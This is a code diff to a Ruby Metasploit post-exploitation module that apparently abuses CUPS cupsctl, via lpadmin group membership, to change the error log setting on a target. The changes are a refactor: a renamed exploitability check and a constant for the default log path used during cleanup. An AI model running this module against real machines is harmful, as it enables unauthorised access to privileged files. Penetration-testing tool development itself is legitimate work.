@@ -10,6 +10,7 @@ class Metasploit3 < Msf::Post
 	include Msf::Post::Common
 
 	LP_GROUPS = ['lpadmin', '_lpadmin']
+	PREV_ERROR_LOG_PATH = '/var/log/cups/error_log'
 
 	attr_accessor :web_server_was_disabled, :error_log_was_reset
 
@@ -53,7 +54,7 @@ class Metasploit3 < Msf::Post
 		], self.class)
 	end
 
-	def check
+	def check_exploitability
 		user = cmd_exec("whoami")
 		user_groups = cmd_exec("groups #{[user].shelljoin}").split(/\s+/)
 		if (user_groups & LP_GROUPS).empty?
@@ -95,7 +96,7 @@ class Metasploit3 < Msf::Post
 	end
 
 	def run
-		if check == Msf::Exploit::CheckCode::Safe
+		if check_exploitability == Msf::Exploit::CheckCode::Safe
 			print_error "Target machine not vulnerable, bailing."
 			return
 		end
@@ -120,12 +121,13 @@ class Metasploit3 < Msf::Post
 	def cleanup
 		print_status "Cleaning up..."
 		cmd_exec("#{ctl_path} WebInterface=no") if web_server_was_disabled
-		cmd_exec("#{ctl_path} ErrorLog=/var/log/cups/error_log") if error_log_was_reset
+		cmd_exec("#{ctl_path} ErrorLog=#{prev_error_log_path}") if error_log_was_reset
 		super
 	end
 
 	private
 
+	def prev_error_log_path; PREV_ERROR_LOG_PATH; end
 	def ctl_path; @ctl_path ||= whereis("cupsctl"); end
 	def strip_http_headers(http); http.gsub(/\A(^.*\r\n)*/, ''); end
 
